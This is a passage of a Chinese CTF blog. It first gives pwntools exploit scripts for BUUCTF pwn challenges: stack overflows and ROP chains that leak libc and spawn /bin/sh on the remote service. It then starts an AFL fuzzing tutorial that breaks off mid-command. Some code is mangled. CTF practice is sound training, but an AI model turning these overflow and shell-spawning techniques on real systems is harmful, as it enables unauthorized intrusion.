class="hljs-attribute">puts_addr</span>=u64(sh.recv(6).ljust(8,&#x27;\x00&#x27;))<br><span class="hljs-comment">#libc=LibcSearcher(&#x27;puts&#x27;, puts_addr)</span><br><span class="hljs-attribute">libcbase</span>=puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;libcbase: &quot;</span>+hex(libcbase))<br><br><span class="hljs-attribute">system_addr</span>=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-attribute">binsh_addr</span>=libcbase+0x18cd57<br><br>payload =<span class="hljs-string">&#x27;A&#x27;</span><span class="hljs-number">*0</span>x58+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)<br>send(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">`from pwn import *`<br>`sh = remote(&#x27;pwn.buuoj.cn&#x27;, <span class="hljs-number">20035</span>)`<br>`address=<span class="hljs-number">0</span>x40060D`<br>`payload = &#x27;A&#x27; * <span class="hljs-number">72</span> + p64(address)`<br>`sh.send(payload)`<br>sh.interactive()` <br></code></pre></td></tr></table></figure><h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>sh = remote(<span class="hljs-string">&#x27;pwn.buuoj.cn&#x27;</span>, 20086)<br><span class="hljs-attribute">address</span>=0x08048F0D<br>payload = <span class="hljs-string">&#x27;I&#x27;</span><span class="hljs-number">*21</span>+<span class="hljs-string">&#x27;a&#x27;</span> + p32(address)<br>sh.send(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">from</span> time import *<br><span class="hljs-attribute">context</span>.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><span class="hljs-attribute">context</span>.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-attribute">elf</span> = ELF(<span class="hljs-string">&quot;c&quot;</span>)<br><span class="hljs-attribute">sh</span> = <span class="hljs-number">0</span><br><span class="hljs-attribute">lib</span> = <span class="hljs-number">0</span><br><span class="hljs-attribute">def</span> pwn(ip,port,debug):<br><span class="hljs-attribute">global</span> sh<br><span class="hljs-attribute">global</span> lib<br><span class="hljs-attribute">if</span>(debug == <span class="hljs-number">1</span>):<br><span class="hljs-attribute">sh</span> = process(<span class="hljs-string">&quot;./c&quot;</span>)<br><br><span class="hljs-attribute">else</span>:<br><span class="hljs-attribute">sh</span> = remote(ip,port)<br><span class="hljs-attribute">pop_rdi_ret</span> = <span class="hljs-number">0</span>x<span class="hljs-number">400793</span><br><span class="hljs-attribute">offset</span> = <span class="hljs-number">56</span><br><span class="hljs-attribute">payload</span>  = offset * <span class="hljs-string">&quot;a&quot;</span><br><span class="hljs-attribute">payload</span> += p<span class="hljs-number">64</span>(pop_rdi_ret) + p<span class="hljs-number">64</span>(elf.bss()) + p<span class="hljs-number">64</span>(elf.plt[&#x27;gets&#x27;])<br><span class="hljs-attribute">payload</span> += p<span class="hljs-number">64</span>(pop_rdi_ret) + p<span class="hljs-number">64</span>(elf.bss()) + p<span class="hljs-number">64</span>(elf.plt[&#x27;system&#x27;])<br><span class="hljs-attribute">sh</span>.sendline(payload)<br><span class="hljs-attribute">sleep</span>(<span class="hljs-number">0</span>.<span class="hljs-number">2</span>)<br><span class="hljs-attribute">sh</span>.sendline(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><span class="hljs-attribute">sh</span>.interactive()<br><br><span class="hljs-attribute">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><span class="hljs-attribute">pwn</span>(<span class="hljs-string">&quot;pwn.buuoj.cn&quot;</span>,<span class="hljs-number">20137</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs css">#!/usr/bin/python2.<span class="hljs-number">7</span>  <br><br># -*- coding: utf-<span class="hljs-number">8</span> -*-<br><br>from pwn import *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>elf = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&quot;ciscn_2019_en_2&quot;</span>)<br>sh = <span class="hljs-number">0</span><br>lib = <span class="hljs-number">0</span><br>def <span class="hljs-built_in">pwn</span>(ip,port,debug):<br>global sh<br>global lib<br><span class="hljs-built_in">if</span>(debug == <span class="hljs-number">1</span>):<br>sh = <span class="hljs-built_in">process</span>(<span class="hljs-string">&quot;./ciscn_2019_en_2&quot;</span>)<br>lib = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>else:<br>sh = <span class="hljs-built_in">remote</span>(ip,port)<br>lib = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&quot;/home/r3teax/Desktop/x64_libc.so.6&quot;</span>)<br>sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&quot;Input your choice!&quot;</span>)<br>sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-string">&quot;1&quot;</span>)<br>sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>)<br>payload  = <span class="hljs-string">&quot;a\x00&quot;</span><br>offset = <span class="hljs-number">88</span><br>pop_rdi_ret = <span class="hljs-number">0</span>x400c83<br>#ROPgadget --binary ciscn_2019_en_2  --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-string">&#x27;rdi&#x27;</span><br>payload  = <span class="hljs-string">&quot;a&quot;</span> * offset<br>payload += <span class="hljs-built_in">p64</span>(pop_rdi_ret) + <span class="hljs-built_in">p64</span>(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]) + <span class="hljs-built_in">p64</span>(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload += <span class="hljs-built_in">p64</span>(elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>])<br>sh.<span class="hljs-built_in">recv</span>()<br>sh.<span class="hljs-built_in">sendline</span>(payload)<br>libc = <span class="hljs-built_in">u64</span>(sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&quot;\x7f\x0a&quot;</span>,)[-<span class="hljs-number">7</span>:].<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>)) % <span class="hljs-number">0</span>x1000000000000 - lib.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>system = libc + lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc + lib.<span class="hljs-built_in">search</span>(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>).<span class="hljs-built_in">next</span>()<br><br><br>    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&quot;Input your choice!&quot;</span>)<br>    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-string">&quot;1&quot;</span>)<br>    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>)<br>    payload  = <span class="hljs-string">&quot;a\x00&quot;</span><br>    offset = <span class="hljs-number">88</span><br>    payload  = <span class="hljs-string">&quot;a&quot;</span> * offset<br>    payload += <span class="hljs-built_in">p64</span>(pop_rdi_ret) + <span class="hljs-built_in">p64</span>(binsh) + <span class="hljs-built_in">p64</span>(system)<br>    sh.<span class="hljs-built_in">sendline</span>(payload)<br>    log.<span class="hljs-built_in">success</span>(<span class="hljs-string">&quot;libc: &quot;</span> + <span class="hljs-built_in">hex</span>(libc))<br>    log.<span class="hljs-built_in">success</span>(<span class="hljs-string">&quot;system: &quot;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.<span class="hljs-built_in">success</span>(<span class="hljs-string">&quot;binsh: &quot;</span> + <span class="hljs-built_in">hex</span>(binsh))<br>    sh.<span class="hljs-built_in">interactive</span>()<br><br>if __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><span class="hljs-built_in">pwn</span>(<span class="hljs-string">&quot;pwn.buuoj.cn&quot;</span>,<span class="hljs-number">20123</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> time import *<br>def enc(st):    <br>enst = []    <br>dst = []    <br>dst.append((st&amp;0xff0000) &gt;&gt; 16)    <br>dst.append((st&amp;0x00ff00) &gt;&gt; 8)    <br>dst.append(st&amp;0xff)    <br><span class="hljs-builtin-name">print</span>(dst)    <br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dst:        <br>oc = c        <br><span class="hljs-keyword">if</span> (c &lt;= 96) <span class="hljs-keyword">or</span> (c &gt; 122):           <br> <span class="hljs-keyword">if</span> (c &lt;= 64) <span class="hljs-keyword">or</span> (c &gt; 90):                <br> <span class="hljs-keyword">if</span> (c &gt; 47) <span class="hljs-keyword">and</span> (c &lt;= 57):                    <br> oc = c ^ 0xf            <br> <span class="hljs-keyword">else</span>:                <br> oc = c ^ 0xe        <br> <span class="hljs-keyword">else</span>:            <br> oc = c ^ 0xd        <br> enst.append(oc)    <br> res = 0x0000000000000000    <br> res = (enst[0] &lt;&lt; 16) + res    <br>res = (enst[1] &lt;&lt; 8) + res    <br>res = (enst[2]) + res    <br>return res <br><br><span class="hljs-comment">#recv(8)到的数据是小端的，要反过来</span><br>def upack(address):<br> <span class="hljs-attribute">ad1</span>=address&amp;0xff<br> ad2=(address&gt;&gt;8)&amp;0xff<br> ad3=(address&gt;&gt;16)&amp;0xff<br> ad4=(address&gt;&gt;24)&amp;0xff<br> ad5=(address&gt;&gt;32)&amp;0xff<br> ad6=(address&gt;&gt;40)&amp;0xff<br> <span class="hljs-attribute">Address</span>=ad1<br> <span class="hljs-attribute">Address</span>=Address*0x100+ad2<br> <span class="hljs-attribute">Address</span>=Address*0x100+ad3<br> <span class="hljs-attribute">Address</span>=Address*0x100+ad4<br> <span class="hljs-attribute">Address</span>=Address*0x100+ad5<br> <span class="hljs-attribute">Address</span>=Address*0x100+ad6<br> return<span class="hljs-built_in"> Address</span><br><span class="hljs-built_in"></span><span class="hljs-comment">#设置</span><br><span class="hljs-comment">#-----Settings------</span><br><span class="hljs-attribute">Remote</span>=1<br><span class="hljs-attribute">Debug</span>=0<br><span class="hljs-attribute">Detail</span>=0<br><span class="hljs-comment">#------------------</span><br><span class="hljs-attribute">libc</span>=ELF(&#x27;/home/r3teax/Desktop/x64_libc.so.6&#x27;) #cp /lib/x86_64-linux-gnu/libc-2.23.so libc.so  <br><br><span class="hljs-keyword">if</span> Remote:<br><span class="hljs-attribute">p</span>=remote(&quot;pwn.buuoj.cn&quot;,20123)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-attribute">p</span>=process(&quot;./Emachine&quot;)<br><span class="hljs-keyword">if</span> Debug:<br>#gdb.attach(p,<span class="hljs-string">&#x27;b *0x400aee&#x27;</span>)<br>gdb.attach(p,<span class="hljs-string">&#x27;b main&#x27;</span>)<br><span class="hljs-keyword">if</span> Detail:<br>context.<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span> <br><br><span class="hljs-attribute">puts_got</span>=0x602020 #需要泄露的地址<br><span class="hljs-attribute">puts_plt</span>=0x4006e0<br><span class="hljs-attribute">pop_rdi</span>=0x400c83<br><span class="hljs-attribute">ret2encrypt</span>=0x4009A0<br><span class="hljs-attribute">main</span>=0x400b28<br><br> #libc.so.6<br> #<span class="hljs-attribute">Puts_execve</span>=0x31580<br> #<span class="hljs-attribute">Puts_system</span>=0x31580<br> #<span class="hljs-attribute">Puts_sh</span>=0x1334da<br> #<span class="hljs-attribute">one_gadget</span>=0x64cdf  <br><span class="hljs-attribute">offset1</span>=libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]-libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-attribute">offset2</span>=libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]-next(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)) <br><br> #第一条ROP链<br> #使用puts构造leak<br>def leak(address):<br> p.recvuntil(<span class="hljs-string">&quot;choice!&quot;</span>)<br> p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br> sleep(0.1)<br> <span class="hljs-attribute">payload</span>=p64(0)*(88/8) #88字节造成溢出<br> payload+=p64(pop_rdi)  #gadget<br> #payload+=p64(puts_got) #args<br> payload+=p64(address) #泄露的地址<br> payload+=p64(puts_plt) #call puts<br> payload+=p64(main) #重新执行函数<br> <span class="hljs-builtin-name">print</span> <span class="hljs-string">&quot;payload=&quot;</span>+payload<br> p.sendline(payload) <br> p.recvuntil(<span class="hljs-string">&#x27;Ciphertext&#x27;</span>)<br>        p.recvline()<br> p.recvline()<br> <span class="hljs-attribute">Data</span>=p.recv(6) #接收泄露的地址<br> <span class="hljs-builtin-name">print</span> <span class="hljs-string">&quot;addresss=&quot;</span>+(Data).encode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br> <span class="hljs-attribute">Data</span>=int((Data).encode(&#x27;hex&#x27;),16)<br> #<span class="hljs-builtin-name">print</span> upack(Data)<br> #log.<span class="hljs-builtin-name">info</span>(<span class="hljs-string">&quot;%#x=&gt;%s&quot;</span>%(address, (Data <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;&#x27;</span>).encode(<span class="hljs-string">&#x27;hex&#x27;</span>)))<br> return Data  <br> #<span class="hljs-attribute">d</span>=DynELF(leak,elf=ELF(&#x27;./Emachine&#x27;)) #没有成功leak出来 <br><br> #根据偏移计算system和bin/sh的真实地址<br><span class="hljs-attribute">puts_addr</span>=leak(puts_got)<br><span class="hljs-attribute">system_address</span>=upack(puts_addr)-offset1<br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&quot;system_address=&quot;</span>+hex(system_address) <br><span class="hljs-attribute">sh_addr</span>=upack(puts_addr)-offset2<br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&quot;sh_address=&quot;</span>+hex(sh_addr) <br><br><span class="hljs-comment">#第二条ROP链</span><br>p.recvuntil(<span class="hljs-string">&quot;choice!&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>sleep(0.1)<br><span class="hljs-attribute">payload2</span>=p64(0)*(88/8)<br>payload2+=p64(pop_rdi) #gadget<br>payload2+=p64(sh_addr)<br>payload2+=p64(system_address) #call<span class="hljs-built_in"> system</span><br><span class="hljs-built_in"></span>p.sendline(payload2)<br>p.interactive() <br></code></pre></td></tr></table></figure><p>自己写的：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-keyword">from</span> LibcSearcher import *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-attribute">sh</span>=remote(&#x27;pwn.buuoj.cn&#x27;,20123)<br><span class="hljs-attribute">elf</span>=ELF(&quot;ciscn_2019_en_2&quot;)<br><span class="hljs-attribute">puts_plt</span>=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">puts_got</span>=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">main_addr</span>=elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>sh.recvuntil(<span class="hljs-string">&quot;Input your choice!\n&quot;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)<br><span class="hljs-attribute">offset</span>=<span class="hljs-string">&#x27;\0&#x27;</span>+&#x27;a&#x27;*87<br><span class="hljs-attribute">pop_rdi_ret</span>=0x0000000000400c83<br><span class="hljs-attribute">payload</span>=offset+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)<br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">&quot;Ciphertext\n&quot;</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-attribute">drop</span>=<span class="hljs-literal">True</span>)<br><span class="hljs-attribute">puts_addr</span>=u64(sh.recvuntil(&quot;\n&quot;,drop=True)+&#x27;\0\0&#x27;)<br><span class="hljs-attribute">obj</span>=LibcSearcher(&quot;puts&quot;,puts_addr)<br><span class="hljs-attribute">libc_puts</span>=obj.dump(&quot;puts&quot;)<br><span class="hljs-attribute">base_addr</span>=puts_addr-libc_puts<br><span class="hljs-attribute">system_addr</span>=base_addr+obj.dump(&quot;system&quot;)<br><span class="hljs-attribute">binsh_addr</span>=base_addr+obj.dump(&quot;str_bin_sh&quot;)<br><span class="hljs-attribute">payload2</span>=offset+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)<br>sh.recvuntil(<span class="hljs-string">&quot;Input your choice!\n&quot;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)<br>sh.sendline(payload2)<br>sh.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>afl fuzz入门</title>
    <link href="/2022/02/21/AFL_FUZZ/"/>
    <url>/2022/02/21/AFL_FUZZ/</url>
    
    <content type="html"><![CDATA[<p>AFL则是fuzzing的一个很好用的工具，全称是American Fuzzy Lop，由Google安全工程师Michał Zalewski开发的一款开源fuzzing测试工具，可以高效地对二进制程序进行fuzzing，挖掘可能存在的内存安全漏洞，如栈溢出、堆溢出、UAF、double free等。由于需要在相关代码处插桩，因此AFL主要用于对开源软件进行测试。当然配合QEMU等工具，也可对闭源二进制代码进行fuzzing，但执行效率会受到影响</p><p>工作原理：</p><p>通过对源码进行重新编译时进行插桩（简称编译时插桩）的方式自动产生测试用例来探索二进制程序内部新的执行路径。AFL也支持直接对没有源码的二进制程序进行测试，但需要QEMU的支持。</p><span id="more"></span><h2 id="安装ALF-FUZZ"><a href="#安装ALF-FUZZ" class="headerlink" title="安装ALF FUZZ"></a>安装ALF FUZZ</h2><p>官网下载源码：<a href="https://lcamtuf.coredump.cx/afl/">https://lcamtuf.coredump.cx/afl/</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span>lcamtuf.coredump.cx<span class="hljs-regexp">/afl/</span>releases/afl-latest.tgz<br>tar xvf afl-latest.tgz<br>cd afl-<span class="hljs-number">2.52</span>b/<br>make<br>sudo make install<br></code></pre></td></tr></table></figure><h2 id="使用AFL插桩程序（有源码）"><a href="#使用AFL插桩程序（有源码）" class="headerlink" title="使用AFL插桩程序（有源码）"></a>使用AFL插桩程序（有源码）</h2><p>这里以upx为例进行测试</p><h3 id="编译upx"><a href="#编译upx" class="headerlink" title="编译upx"></a>编译upx</h3><p> upx项目地址：<a href="https://github.com/upx/upx">https://github.com/upx/upx</a></p><p>因为afl会对有源码的程序进行重新编译,因此需要修改upx的Makefile</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/upx/u</span>px.git<br><span class="hljs-comment">#git镜像：git clone --depth=1 https://github.com.cnpmjs.org/upx/upx.git</span><br>cd upx<br>vim Makefile<br>CC = <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>afl-gcc <span class="hljs-comment">#添加此句</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd src<br>vim Makefile<br>CXX= <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>afl-g++ <span class="hljs-comment">#将CXX改成afl-g++</span><br></code></pre></td></tr></table></figure><p>通过upx的文档,还需要安装三个库:</p><h4 id="安装lzma-sdk"><a href="#安装lzma-sdk" class="headerlink" title="安装lzma-sdk"></a>安装lzma-sdk</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git submodule update --init --recursive<br></code></pre></td></tr></table></figure><h4 id="安装ucl"><a href="#安装ucl" class="headerlink" title="安装ucl"></a>安装ucl</h4><ul><li><p>下载<a href="http://www.oberhumer.com/opensource/ucl/#download">ucl</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://www.oberhumer.com/opensource/ucl/download/ucl-1.03.tar.gz<br></code></pre></td></tr></table></figure></li><li><p>编译:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -zxvf ucl-1.03.tar.gz<br><span class="hljs-built_in">cd</span> ucl-1.03<br>./configure<br>make <br>sudo make install<br></code></pre></td></tr></table></figure><p>configure时出错</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs smali">checking whether your compiler passes the ACC conformance test... FAILED<br>configure: <br>configure: Your compiler failed the ACC conformance test - for details see <br>configure: `config.log&#x27;. Please<span class="hljs-built_in"> check </span>that log file<span class="hljs-built_in"> and </span>consider sending<br>configure: a patch<span class="hljs-built_in"> or </span>bug-report to &lt;markus@oberhumer.com&gt;.<br>configure: Thanks for your support.<br>configure: <br>configure: error: ACC conformance test failed. Stop.<br></code></pre></td></tr></table></figure><p>解决方法</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">./configure <span class="hljs-attribute">CPPFLAGS</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$CPPFLAGS</span> -std=c90 -fPIC&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> UPX_UCCLDIR=<span class="hljs-string">&quot;~/ucl-1.03&quot;</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="安装zlib"><a href="#安装zlib" class="headerlink" title="安装zlib"></a>安装zlib</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://pkgs.fedoraproject.org/repo/pkgs/zlib/zlib-1.2.11.tar.xz/sha512/b7f50ada138c7f93eb7eb1631efccd1d9f03a5e77b6c13c8b757017b2d462e19d2d3e01c50fad60a4ae1bc86d431f6f94c72c11ff410c25121e571953017cb67/zlib-1.2.11.tar.xz<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar xvJf 